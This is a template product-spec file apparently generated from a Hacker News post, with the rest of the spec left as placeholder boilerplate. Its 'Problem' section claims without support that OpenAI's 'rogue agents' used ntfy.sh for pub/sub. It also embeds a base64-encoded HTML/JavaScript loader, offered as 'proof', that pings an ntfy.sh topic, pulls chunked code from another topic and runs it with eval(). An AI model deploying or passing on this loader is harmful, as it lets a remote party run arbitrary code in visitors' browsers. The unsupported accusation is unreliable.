# SPEC.md — OpenAI's rogue agents used ntfy.sh as a pub/sub channel

## Problem

Looks like OpenAI&#x27;s rogue agents used https:&#x2F;&#x2F;ntfy.sh as a pub&#x2F;sub channel. This payload publishes via GET in an img tag, pulls chunked base64 JS from a topic, and eval()&#x27;s it. Remote code via GET only.<p>Proof: https:&#x2F;&#x2F;httpbin.org&#x2F;base64&#x2F;PGJvZHk-PGltZyBzcmM9Imh0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1QMyI-PGltZyBzcmM9L2RlbGF5LzEwPjxzY3JpcHQ-dmFyIG49MDtmdW5jdGlvbiBEKCl7aWYobisrPDUpe3ZhciBpPW5ldyBJbWFnZSgp%20%20%20%20O2kub25lcnJvcj1pLm9ubG9hZD1EO2kuc3JjPScvZGVsYXkvMTA_Yz0nK247ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKX19RCgpO2ZldGNoKCdodHRwczovL250Znkuc2gvZ3BsZW9lbnNvL3Jhdz9wb2xsPTEmc2luY2U9YWxsJykudGhlbihmdW5jdGlvbihyKXtyZXR1cm4%20%20%20%20gci50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe3ZhciBMPXQuc3BsaXQoJ1xuJykuZmlsdGVyKGZ1bmN0aW9uKGwpe3JldHVybiBsLnNsaWNlKDAsMSk9PSd6J30pLnNvcnQoKTt2YXIgYj1MLm1hcChmdW5jdGlvbihsKXtyZXR1cm4gbC5zbGljZSgzKX0pLmpvaW4oJycpO2I9Yi%20%20%20%205zcGxpdCgnLScpLmpvaW4oJysnKS5zcGxpdCgnXycpLmpvaW4oJy8nKTtldmFsKGF0b2IoYikpfSkuY2F0Y2goZnVuY3Rpb24oZSl7ZmV0Y2goJ2h0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1MT0RFUicrZW5jb2RlVVJJQ29uZW50KCgnJytlKS5zb%20%20%20%20GljZSgwLDQwKSkpfSk8L3NjcmlwdD4=

**Source:** [HackerNews](https://news.ycombinator.com/item?id=49573952)
**Primary category:** ask-hn
**Tags:** Ask HN,Problem
**Date:** 2026-09-05T07:12:51Z

---

## Objective

Build a solution that addresses this problem clearly and at scale.

---

## Target Users

1. **[Primary user]** — the main user this serves
2. **[Secondary user]** — other relevant users

## MVP Scope

- Core functionality
- Leave out anything beyond the MVP

## Design Direction

See `DESIGN.md` for this project's design tokens.

## Constraints

- Keep the MVP simple
- No unnecessary external dependencies
